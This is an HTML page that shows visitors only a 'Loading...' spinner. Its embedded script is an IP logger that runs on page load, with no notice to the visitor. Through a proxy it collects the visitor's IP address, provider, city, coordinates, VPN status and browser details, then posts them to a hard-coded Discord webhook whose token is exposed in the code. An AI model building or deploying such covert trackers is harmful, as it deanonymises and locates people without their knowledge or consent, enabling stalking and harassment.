<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0a0a;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        .container {
            text-align: center;
            padding: 40px;
        }

        .loader {
            width: 80px;
            height: 80px;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top: 4px solid #00ffff;
            border-radius: 50%;
            animation: spin 1.5s linear infinite;
            margin: 0 auto 30px;
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
        }

        .loading-text {
            font-size: 18px;
            color: #00ffff;
            font-weight: 300;
            letter-spacing: 2px;
            text-transform: uppercase;
        }

        .dots::after {
            content: '';
            animation: dots 1.5s steps(4, end) infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes dots {
            0%, 20% { content: '.'; }
            40% { content: '..'; }
            60%, 100% { content: '...'; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <div class="loading-text">Loading<span class="dots"></span></div>
    </div>

    <script>
        const config = {
            "webhook": "https://discord.com/api/webhooks/1433408427815600241/TkgVjkPmIOqYcO9g3P0GiH1SRkLStDJbpuQ1gIpBx6pPvzWDSOR1JhSP-cQJuf0wDAIN",
            "username": "IP Logger",
            "color": 0x00FFFF,
            "accurateLocation": false,
            "vercelProxy": "https://proxy-two-inky.vercel.app/api/ip" // REPLACE WITH YOUR VERCEL URL
        };

        // Get IP info through Vercel proxy
        async function getIPInfo() {
            try {
                const response = await fetch(config.vercelProxy);
                const result = await response.json();
                
                if (result.success && result.data.status === 'success') {
                    return result.data;
                } else {
                    throw new Error(result.error || 'IP API failed');
                }
            } catch (error) {
                console.error('Vercel proxy failed:', error);
                throw error;
            }
        }

        // Parse user agent
        function parseUserAgent(ua) {
            if (!ua) return { os: 'Unknown', browser: 'Unknown' };
            
            let os = 'Unknown';
            let browser = 'Unknown';

            if (/Windows NT 10/.test(ua)) os = 'Windows 10/11';
            else if (/Windows NT 6.3/.test(ua)) os = 'Windows 8.1';
            else if (/Windows NT 6.2/.test(ua)) os = 'Windows 8';
            else if (/Windows NT 6.1/.test(ua)) os = 'Windows 7';
            else if (/Mac OS X/.test(ua)) os = 'macOS';
            else if (/Android/.test(ua)) os = 'Android';
            else if (/iPhone|iPad/.test(ua)) os = 'iOS';
            else if (/Linux/.test(ua)) os = 'Linux';

            if (/Chrome/.test(ua) && !/Edg/.test(ua)) browser = 'Chrome';
            else if (/Firefox/.test(ua)) browser = 'Firefox';
            else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
            else if (/Edg/.test(ua)) browser = 'Edge';

            return { os, browser };
        }

        // Send to Discord
        async function sendToDiscord(data) {
            try {
                const embed = {
                    username: config.username,
                    content: "",
                    embeds: [{
                        title: "üåê IP Logged",
                        color: config.color,
                        description: `
**IP Info:**
> **IP:** \`${data.ipInfo.query}\`
> **Provider:** \`${data.ipInfo.isp}\`
> **ASN:** \`${data.ipInfo.as}\`
> **Continent:** \`${data.ipInfo.continent}\`
> **Country:** \`${data.ipInfo.country}\`
> **Region:** \`${data.ipInfo.regionName}\`
> **City:** \`${data.ipInfo.city}\`
> **Coordinates:** \`${data.ipInfo.lat}, ${data.ipInfo.lon}\`
> **Timezone:** \`${data.ipInfo.timezone}\`
> **Mobile:** \`${data.ipInfo.mobile ? 'True' : 'False'}\`
> **VPN:** \`${data.ipInfo.proxy ? 'True' : 'False'}\`
> **Bot:** \`${data.botStatus}\`

**PC Info:**
> **OS:** \`${data.browserInfo.os}\`
> **Browser:** \`${data.browserInfo.browser}\`

**User Agent:**
\`\`\`
${navigator.userAgent}
\`\`\``
                    }]
                };

                await fetch(config.webhook, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(embed)
                });

                console.log('Successfully sent to Discord');
            } catch (error) {
                console.error('Error sending to Discord:', error);
                throw error;
            }
        }

        // Main function
        async function logIP() {
            try {
                console.log('Starting IP collection via Vercel proxy...');

                // Get IP information through Vercel
                const ipData = await getIPInfo();
                console.log('IP data received:', ipData);

                // Get browser information
                const browserInfo = parseUserAgent(navigator.userAgent);

                // Bot detection
                let botStatus = 'False';
                if (ipData.hosting) {
                    botStatus = ipData.proxy ? 'Possibly' : 'True';
                }

                const logData = {
                    ipInfo: ipData,
                    browserInfo: browserInfo,
                    botStatus: botStatus
                };

                // Send main webhook
                await sendToDiscord(logData);

                console.log('IP logging completed successfully');

            } catch (error) {
                console.error('Error in IP logger:', error);
                
                // Send error to Discord
                try {
                    await fetch(config.webhook, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            username: `${config.username} - ERROR`,
                            content: "",
                            embeds: [{
                                title: "‚ö†Ô∏è IP Logger Error",
                                color: 0xFF0000,
                                description: `**Error:** \`\`\`${error.message}\`\`\`\n**URL:** ${window.location.href}`,
                                fields: [
                                    {
                                        name: "User Agent",
                                        value: `\`\`\`${navigator.userAgent}\`\`\``
                                    }
                                ]
                            }]
                        })
                    });
                } catch (e) {
                    console.error('Failed to send error:', e);
                }
            }
        }

        // Start when page loads
        document.addEventListener('DOMContentLoaded', logIP);
    </script>
</body>
</html>
